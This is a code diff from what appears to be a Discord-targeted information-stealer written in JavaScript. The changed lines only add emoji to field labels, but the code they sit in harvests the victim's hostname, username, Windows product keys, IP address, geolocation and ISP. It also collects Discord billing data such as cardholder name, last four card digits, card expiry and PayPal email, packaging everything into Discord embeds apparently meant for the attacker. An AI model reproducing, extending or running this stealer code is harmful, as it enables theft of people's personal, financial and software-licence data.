@@ -16,16 +16,16 @@ const json = async (zipFile) => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
   const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'Discord.json')).toString());
   const computerInfoFields = [
-    ['RAM', Math.floor(os.totalmem() / 1024 / 1024 / 1024) + 'GB'],
-    ['Name', code(os.hostname())],
-    ['⏲️ Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
+    ['💾 RAM', Math.round(os.totalmem() / 1024 / 1024 / 1024) + 'GB'],
+    ['👨 Name', code(os.hostname())],
+    ['🕘 Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
     ['🥷 Username', code(os.userInfo().username)],
     ['OS version', os.version()],
     ['Product Key', code(require('./product-key').productKey)],
     ['Backup Product Key', code(require('./product-key').backupProductKey)],
   ];
   const ipInfoFields = [
-    ['IP Address', `[${code(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
+    ['1️⃣ IP Address', `[${code(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
     ['🗺️ Location', `[${code(await ipInfo('lat') + ', ' + await ipInfo('lon'))}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
     ['ISP', code(await ipInfo('isp'))],
   ];
@@ -59,15 +59,15 @@ const json = async (zipFile) => {
   discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
     title: `Discord Account - Billing - ${billingType(billing.type)}`,
     fields: (billing.type === 1 ? [
-      ['Default', billing.default],
-      ['Name', billing.billing_address.name],
+      ['✅ Default', billing.default],
+      ['👨 Name', billing.billing_address.name],
       ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
-      ['Ends in', code(billing.last_4)],
-      ['Brand', billing.brand],
-      ['Expires in', code(billing.expires_month + '/' + billing.expires_year)]
+      ['🔚 Ends in', code(billing.last_4)],
+      ['®️ Brand', billing.brand],
+      ['⛔ Expires in', code(billing.expires_month + '/' + billing.expires_year)]
     ] : [
-      ['Default', billing.default],
-      ['Name', billing.billing_address.name],
+      ['✅ Default', billing.default],
+      ['👨 Name', billing.billing_address.name],
       ['✉️ Email', code(billing.email)],
       ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
     ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
